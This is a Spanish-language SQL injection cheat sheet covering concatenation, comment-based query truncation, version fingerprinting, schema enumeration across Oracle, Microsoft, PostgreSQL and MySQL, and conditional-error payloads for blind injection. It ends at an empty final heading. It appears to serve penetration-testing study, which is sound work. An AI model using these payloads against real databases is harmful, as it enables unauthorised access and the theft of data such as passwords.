## Concatenación de cadenas

Gracias a la concatenación de cadenas puedes concatenar varias cadenas para formar una sola cadena.

Oracle y PostgreSQL:

	'foo'||'bar'

Microsoft:

	'foo'+'bar'

MySQL:

	'foo' 'bar'
	CONCAT('foo','bar') 

## Subcadena 

Puede extraer parte de una cadena, desde un desplazamiento específico con una longitud específica. Tenga en cuenta que el índice de compensación está basado en 1. Cada una de las siguientes expresiones devolverá la cadena "bob".

MySQL, PostgreSQL y Microsoft: 

	SUBSTRING('holabob', 5, 3)

Oracle: 

	SUBSTR('holabob', 5, 3)

---
## Comentar

Puede utilizar comentarios para truncar una consulta y eliminar la parte de la consulta original que sigue a su entrada.

Oracle, Microsoft, PostgreSQL y MySQL:

	--comentario

Microsoft, PostgreSQL y MySQL:

	/*comment*/

MySQL:

	#comentario
	-- comentario [Tenga en cuenta el espacio después del doble guión.]

---
## Versión de la base de datos

Puede usar esto para ver la versión de la base de datos.

Microsoft y MySQL:

	@@version

Oracle: 

	SELECT banner FROM v$version
	SELECT version FROM v$instance

PostgreSQL

	SELECT version()

---
## Contenidos de las bases de datos

Sirve para listar informacion sobre lo que contiene la base de datos, como tablas, columnas 
### Informacion de tablas 

PostgreSQL, Mysql y Microsoft:

	SELECT * FROM information_schema.tables

Las columnas que contiene esta tabla es: 

1. **table_catalog:** Nombre del catálogo al que pertenece la tabla (puede ser equivalente a la base de datos en algunos sistemas).
2. **table_schema:** Nombre del esquema al que pertenece la tabla.
3. **table_name:** Nombre de la tabla.
4. **table_type:** Tipo de la tabla (puede ser 'BASE TABLE' para tablas normales, 'VIEW' para vistas, etc.).
5. **engine (o similar):** Tipo de motor de almacenamiento utilizado por la tabla.
6. **version:** Versión del motor de almacenamiento.
7. **row_format:** Formato de fila utilizado por la tabla.
8. **table_rows:** Número aproximado de filas en la tabla.
9. **avg_row_length:** Longitud promedio de una fila en la tabla.
10. **data_length:** Tamaño total de los datos de la tabla.
11. **index_length:** Tamaño total de los índices de la tabla.
12. **auto_increment:** Valor que indica si la tabla tiene una columna de autoincremento.

Oracle: 

	SELECT * FROM all_tables

1. **OWNER:** Propietario del objeto de base de datos (usuario).
2. **TABLE_NAME:** Nombre de la tabla.
3. **TABLESPACE_NAME:** Nombre del tablespace en el que se encuentra la tabla.
4. **CLUSTER_NAME:** Nombre del clúster al que pertenece la tabla (si está en un clúster).
5. **IOT_NAME:** Nombre del índice organizado por tabla (si la tabla es una tabla organizada por índices).
6. **STATUS:** Estado de la tabla (VALID, INVALID, etc.).
7. **PCT_FREE:** Porcentaje de espacio libre en cada bloque de datos.
8. **PCT_USED:** Porcentaje de espacio utilizado en cada bloque de datos.
9. **INI_TRANS:** Número inicial de transacciones concurrentes permitidas.
10. **MAX_TRANS:** Número máximo de transacciones concurrentes permitidas.

### Informacion de columnas 

PostgreSQL, Mysql y Microsoft:

	SELECT * FROM information_schema.columns WHERE table_name = 'TABLE-NAME-HERE'

1. **table_catalog:** El nombre del catálogo al que pertenece la tabla.
2. **table_schema:** El nombre del esquema al que pertenece la tabla.
3. **table_name:** El nombre de la tabla.
4. **column_name:** El nombre de la columna.
5. **ordinal_position:** La posición ordinal de la columna en la tabla.
6. **column_default:** El valor predeterminado de la columna.
7. **is_nullable:** Indica si la columna permite valores nulos (YES/NO).
8. **data_type:** El tipo de datos de la columna.
9. **character_maximum_length:** La longitud máxima de caracteres para columnas de tipo de datos de caracteres.
10. **numeric_precision:** La precisión numérica para columnas de tipo de datos numéricos.
11. **numeric_scale:** La escala numérica para columnas de tipo de datos numéricos.
12. **datetime_precision:** La precisión para columnas de tipo de datos de fecha y hora.
13. **character_set_name:** El conjunto de caracteres de la columna.
14. **collation_name:** La configuración de intercalación de la columna.

Oracle:

	SELECT * FROM all_tab_columns WHERE table_name = 'TABLE-NAME-HERE'

1. **OWNER:** Propietario del objeto de base de datos (usuario).
2. **TABLE_NAME:** Nombre de la tabla.
3. **COLUMN_NAME:** Nombre de la columna.
4. **DATA_TYPE:** Tipo de datos de la columna.
5. **DATA_LENGTH:** Longitud máxima de la columna en bytes.
6. **DATA_PRECISION:** Precisión numérica para columnas de tipo numérico.
7. **DATA_SCALE:** Escala numérica para columnas de tipo numérico.
8. **NULLABLE:** Indica si la columna permite valores nulos ( 'Y' o 'N').
9. **COLUMN_ID:** Posición ordinal de la columna en la tabla.
10. **DEFAULT_LENGTH:** Longitud del valor predeterminado de la columna.
11. **DATA_DEFAULT:** Valor predeterminado de la columna.
12. **NUM_DISTINCT:** Número aproximado de valores distintos en la columna.
13. **LOW_VALUE:** Valor más bajo almacenado en la columna.
14. **HIGH_VALUE:** Valor más alto almacenado en la columna.
15. **DENSITY:** Densidad de la columna 

---
## Errores condicionales 

Puede servir para inyecciones ciegas en las cuales las paginasno representan la informacio, por lo tanto se pueden usar errores para que la pagina responda o no a las consultas dependiendo si la condicion se cumple o no, esto puede ayudar a obtener contraseñas enteras.

Oracle:

	SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN TO_CHAR(1/0) ELSE NULL END FROM dual

Microsoft: 

	SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN 1/0 ELSE NULL END

PostgreSQL:

	1 = (SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN 1/(SELECT 0) ELSE NULL END)

MySQL

	SELECT IF(YOUR-CONDITION-HERE,(SELECT table_name FROM information_schema.tables),'a')

---
## Extraer datos por errores visibles

